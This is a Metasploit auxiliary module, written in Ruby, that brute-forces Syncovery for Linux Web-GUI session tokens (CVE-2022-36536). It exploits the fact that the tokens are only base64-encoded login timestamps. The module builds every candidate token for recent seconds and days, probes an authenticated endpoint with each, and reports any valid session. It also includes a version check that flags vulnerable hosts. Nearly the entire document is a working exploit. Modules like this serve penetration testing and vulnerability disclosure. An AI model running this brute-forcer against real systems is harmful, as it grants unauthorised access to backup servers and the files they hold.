##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'base64'
require 'date'
require 'json'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Syncovery For Linux Web-GUI Session Token Brute-Forcer',
        'Description' => %q{
          This module attempts to brute-force a valid session token for the Syncovery File Sync & Backup Software Web-GUI
          by generating all possible tokens, for every second between 'DateTime.now' and the given X day(s).
          By default today and yesterday (DAYS = 1) will be checked. If a valid session token is found, the module stops.
          The vulnerability exists, because in Syncovery session tokens are basically just base64(m/d/Y H:M:S) at the time
          of the login instead of a random token.
          If a user does not log out (Syncovery v8.x has no logout) session tokens will remain valid until reboot.
        },
        'Author' => [ 'Jan Rude' ],
        'References' => [
          ['URL', 'https://www.mgm-sp.com/en/multiple-vulnerabilities-in-syncovery-for-linux/'],
          ['CVE', '2022-36536']
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'DefaultOptions' => {
          'RPORT' => 8999,
          'STOP_ON_SUCCESS' => true # One valid session is enough
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8999), # Default is HTTP: 8999; HTTPS: 8943
        OptInt.new('DAYS', [true, 'Check today and last X day(s) for valid session token', 1]),
        OptString.new('TARGETURI', [false, 'The path to Syncovery', '/'])
      ]
    )

    deregister_options(
      'USERNAME', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'DB_SKIP_EXISTING',
      'NTLM::SendLM', 'NTLM::SendNTLM', 'NTLM::SendSPN', 'NTLM::UseLMKey', 'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2',
      'REMOVE_USERPASS_FILE', 'REMOVE_USER_FILE', 'DOMAIN', 'HttpUsername', 'PASSWORD_SPRAY', 'BLANK_PASSWORDS',
      'USER_FILE', 'USERPASS_FILE', 'PASS_FILE', 'PASSWORD'
    )
  end

  def check_host(_ip)
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, '/get_global_variables'),
      'method' => 'GET'
    )
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to host - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Error (response code: #{res.code})") if res.code != 200

    if res.code == 200
      json_res = res.get_json_document
      if json_res && (json_res['isSyncoveryLinux'] || !json_res['isSyncoveryWindows'])
        version = (json_res['SyncoveryTitle']).scan(/Syncovery\s([A-Za-z0-9.]+)/).flatten[0] || ''
        if version.empty?
          vprint_warning("#{rhost}:#{rport} - Could not identify version")
          Exploit::CheckCode::Detected
        elsif Rex::Version.new(version) < Rex::Version.new('9.48j') || Rex::Version.new(version) == '9.48'
          vprint_good("#{rhost}:#{rport} - Syncovery #{version}")
          Exploit::CheckCode::Vulnerable
        else
          vprint_status("#{rhost}:#{rport} - Syncovery #{version}")
          Exploit::CheckCode::Safe
        end
      else
        Exploit::CheckCode::Safe
      end
    end
  end

  def run_host(_ip)
    # Calculate dates
    days = datastore['DAYS']
    if days < 0
      days = 0
    end
    dates = []
    (0..days).each do |day|
      dates << (Date.today - day).strftime('%m/%d/%Y')
    end
    time = DateTime.now.strftime('%H:%M:%S')
    hrs = (time.split(':')[0])
    min = (time.split(':')[1])
    sec = (time.split(':')[2])

    # Create an array of possible session token values
    token_queue = []
    dates.each do |date|
      (0..hrs.to_i).reverse_each do |hours|
        (0..min.to_i).reverse_each do |minutes|
          (0..sec.to_i).reverse_each do |seconds|
            timestamp = "#{date} #{format('%.2d', hours)}:#{format('%.2d', minutes)}:#{format('%.2d', seconds)}"
            token_queue << Base64.strict_encode64(timestamp).strip
          end
          sec = 59
        end
        min = 59
      end
      hrs = 23
    end

    # Send the request and parse the response. If it does not include 'Session Expired' the token is valid
    begin
      print_status("#{peer.strip} - Starting Brute-Forcer")
      token_queue.each do |token|
        login_uri = normalize_uri(target_uri.path, '/profiles.json?recordstartindex=0&recordendindex=0')
        res = send_request_cgi({
          'uri' => login_uri,
          'method' => 'GET',
          'headers' => {
            'token' => token
          }
        })

        return false if !res

        if res.code == 200 && (!res.body.to_s.include? 'Session Expired')
          print_good("#{rhost}:#{rport} - Valid token found: '#{token}'")
          return true
        else
          vprint_error("#{rhost}:#{rport} - Failed: '#{token}'")
        end
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to host")
    rescue ::Timeout::Error, ::Errno::EPIPE
      fail_with(Failure::Unreachable, "#{peer} - Connection timeout")
    end
  end
end
